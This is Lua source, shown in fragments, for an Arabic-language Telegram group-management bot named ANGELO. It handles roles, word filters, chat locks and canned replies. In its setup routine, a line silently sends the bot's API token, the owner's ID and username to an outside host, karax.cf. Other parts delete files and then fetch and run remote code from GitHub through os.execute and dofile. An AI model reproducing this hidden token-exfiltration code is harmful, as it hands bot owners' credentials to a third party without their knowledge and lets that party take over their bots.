...
https.request('http://karax.cf/ANGELO/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("ANGELO", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/ANGELO
token="]]..database:get(id_server..":token")..[["
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./ANGELO.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("BK", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S ANGELO -X kill
screen -S ANGELO ./ANGELO
done
]])  
file:close() 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/ANGELOTEAM/Files_ANGELO/master/File_Bot/commands.lua") 
...
var = 'Bot'
elseif database:sismember(bot_id..'Sudo:User', user_id) then
var = database:get(bot_id.."Sudo:Rd"..msg.chat_id_) or 'Dev'  
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
var = database:get(bot_id.."BasicConstructor:Rd"..msg.chat_id_) or 'Main Owner'
elseif database:sismember(bot_id..'Constructor'..chat_id, user_id) then
var = database:get(bot_id.."Constructor:Rd"..msg.chat_id_) or 'Owner'  
elseif database:sismember(bot_id..'Manager'..chat_id, user_id) then
var = database:get(bot_id.."Manager:Rd"..msg.chat_id_) or 'Manger'  
elseif database:sismember(bot_id..'Mod:User'..chat_id, user_id) then
var = database:get(bot_id.."Mod:Rd"..msg.chat_id_) or 'Admin'  
elseif database:sismember(bot_id..'Special:User'..chat_id, user_id) then  
var = database:get(bot_id.."Special:Rd"..msg.chat_id_) or 'Elit'  
else  
var = database:get(bot_id.."Memp:Rd"..msg.chat_id_) or 'Member'
end  
return var
end 
...
local ANGELO_Msg = ''  
if msgs < 100 then 
ANGELO_Msg = 'غير متفاعل😔💔' 
elseif msgs < 200 then 
ANGELO_Msg = 'بده يتحسن😕💔' 
elseif msgs < 400 then 
ANGELO_Msg = 'شبه متفاعل😗👻' 
elseif msgs < 700 then 
ANGELO_Msg = 'متفاعل😍🙊' 
elseif msgs < 1200 then 
ANGELO_Msg = 'متفاعل قوي😍✔️' 
elseif msgs < 2000 then 
ANGELO_Msg = 'متفاعل جدا😍💘' 
elseif msgs < 3500 then 
ANGELO_Msg = 'اقوى تفاعل🙊👻'  
elseif msgs < 4000 then 
ANGELO_Msg = 'متفاعل نار😍🔥' 
elseif msgs < 4500 then 
ANGELO_Msg = 'قمة التفاعل🤸‍♂️😻' 
elseif msgs < 5500 then 
ANGELO_Msg = 'اقوى متفاعل😳😻' 
elseif msgs < 7000 then 
ANGELO_Msg = 'ملك التفاعل🤴😍' 
elseif msgs < 9500 then 
ANGELO_Msg = 'امبروطور التفاعل💂‍♀️😻' 
elseif msgs < 10000000000 then 
ANGELO_Msg = 'رب التفاعل✔️😍'  
end 
return ANGELO_Msg 
end
...
--------------------------------------------------------------------------------------------------------------
function SourceANGELO(msg,data) -- بداية العمل
if msg then
...
لك الآن اوامر التحكم ببوتك الخاص عن طريق الكيبورد
(t.me/x_BRK)[Dev Source] '
local keyboard = {
{'الاحصائيات 🔍'},
...
send(msg.chat_id_, msg.id_,ANGELO_Msg) 
return false  
end 
if text then    
...
if text == 'معلومات السيرفر 📊' and SudoBot(msg) then 
 local text2 = 'Info Server : \n'
  local ANGELO1 = database:info()
  text2 = text2..'1 - *Uptime Days* : `'..ANGELO1.server.uptime_in_days..'('..ANGELO1.server.uptime_in_seconds..' seconds)`\n'
  text2 = text2..'2 - *Commands Processed* : `'..ANGELO1.stats.total_commands_processed..'`\n'
  text2 = text2..'3 - *Expired Keys* : `'..ANGELO1.stats.expired_keys..'`\n'
  text2 = text2..'4 - *Ops/sec* : `'..ANGELO1.stats.instantaneous_ops_per_sec..'`\n'
send(msg.chat_id_, msg.id_, text2)  
end


if text == 'تحديث السورس ™' and SudoBot(msg) then 
os.execute('rm -rf ANGELO.lua')
os.execute('wget https://raw.githubusercontent.com/ANGELOTEAM/ANGELO/master/ANGELO.lua')
send(msg.chat_id_, msg.id_,'تم تحديث السورس 
الان انت تمتلك احدث نسخه من سورس انجلو}')
dofile('ANGELO.lua')  
end
if text == 'الاصدار 📟' and SudoBot(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,'هذا هو الاصدار الجديد من سورس انجلو') 
end
...
send(msg.chat_id_, msg.id_,'📌| عدد المجموعات الان » { '..#group..' }'..ANGELOk..''..ANGELO..'\n*📌| الان عدد المجموعات الحقيقي » { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
...
usertext = '\n👤| العضو » ['..result.title_..'](t.me/'..(username or 'x_BRK')..')'
...
usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'x_BRK')..')'
status  = '\n🔘| تم ترقيته مطور في البوت'
...
local ANGELO1_Msg = database:get(bot_id.."ANGELO1:Add:Filter:Rp2"..text..msg.chat_id_)   
if ANGELO1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤| العضو ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'x_BRK')..') \n 📬|'..ANGELO1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if ANGELO_Msg and not Special(msg) then  
local ANGELO_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if ANGELO_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠|العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫|["..ANGELO_Msg.."] \n") 
else
send(msg.chat_id_,0,"⚠|العضو : {["..data.first_name_.."](T.ME/x_BRK)}\n🚫|["..ANGELO_Msg.."] \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "⚠|عذرا يا » {["..data.first_name_.."](T.ME/x_BRK)}\n📮| الملصق الذي ارسلته تم منعه من المجموعه \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
🔖↬ANGELO TEAM
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
📮↬[Channel ANGELO](t.me/x_BRK) 

🔰↬[Information](t.me/BBEBW)

👮‍♂️↬[DEVELOPER](t.me/sajad14p)

🔖↬[The way his inauguration](https://t.me/x_BRK/15)
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'👤| بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'x_BRK')..') \n🔘| تـم قفـل الدردشه\n⛔| الحاله ← المسح ')  
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤| بواسطه ← ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'x_BRK')..') \n🔘| تـم قفـل التاك بالكتم\n⛔| الحاله ←الكتم ')  
end,nil)   
...
if SudoBot(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/ANGELOTEAM/Files_ANGELO/master/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n📁| اهلا بك في متجر ملفات انجلو\n🔰| ملفات السورس ↓\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\n"
local TextE = "\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n🔘|  علامة تعني { ✓ } ملف مفعل\n🔘| علامة تعني { ✘ } ملف معطل\n🔖| قناة سورس انجلو ↓\n".."📮| [اضغط هنا لدخول](t.me/x_BRK) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/ANGELOTEAM/Files_ANGELO/master/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('ANGELO.lua')  
else
send(msg.chat_id_, msg.id_,"⚠️| عذرا هاذا ملف ليس من ملفات سورس انجلو\n") 
end
return false
end
...
database:set(bot_id.."ANGELO1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."ANGELO1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"🚸|ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."ANGELO1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."ANGELO1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."ANGELO1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."ANGELO1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_,"🔖|تم منع الكلمه مع التحذير")  
database:del(bot_id.."ANGELO1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."ANGELO1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."ANGELO1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."ANGELO1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_,"🔖|ارسل الكلمه الان")  
database:set(bot_id.."ANGELO1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."ANGELO1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."ANGELO1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."ANGELO1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."ANGELO1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."ANGELO1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."ANGELO1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."ANGELO1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."ANGELO1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n⛔|قائمة المنع \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
for k,v in pairs(list) do  
local ANGELO_Msg = database:get(bot_id.."ANGELO1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..ANGELO_Msg.."}\n"    
end  
if #list == 0 then  
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n👤| العضو » ['..result.title_..'](t.me/'..(text1[3] or 'x_BRK')..')'..'\n🔘| تم رفعه '..text1[2]..' هنا')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'انجلو').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'انجلو')
local ANGELO_Msg = {
'اسمي مينو كول💘؟',
'دا اشرب جاي مفارغلك',
'لابسك لتلح',
...
send(msg.chat_id_, msg.id_,'['..ANGELO_Msg[math.random(#ANGELO_Msg)]..']') 
return false
end
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'انجلو').." غادر" or text == 'غادر' then  
...
-- vardump(data) 
ANGELOdx(msg.chat_id_, msg.id_, '📤| ايدي المجموعة » ( '..msg.chat_id_..' )\n🚸| عدد الادمنيه » ( *'..data.administrator_count_..' )*\n📛| عدد المحظورين » ( *'..data.kicked_count_..' )*\n🏆| عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'انجلو')
...
ANGELO = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(ANGELO)
...
--------------------------------------------------------------------------------------------------------------
SourceANGELO(data.message_,data)
...
------------------------------------------------------------------------
local ANGELOAbot = database:get(bot_id.."ANGELO1:Add:Filter:Rp2"..text..result.chat_id_)   
if ANGELOAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠|العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫|["..ANGELOAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local ANGELO1_Msg = database:get(bot_id.."ANGELO1:Add:Filter:Rp2"..text..result.chat_id_)   
if ANGELO1_Msg then    
send(msg.chat_id_, msg.id_,"🔖|"..ANGELO1_Msg)
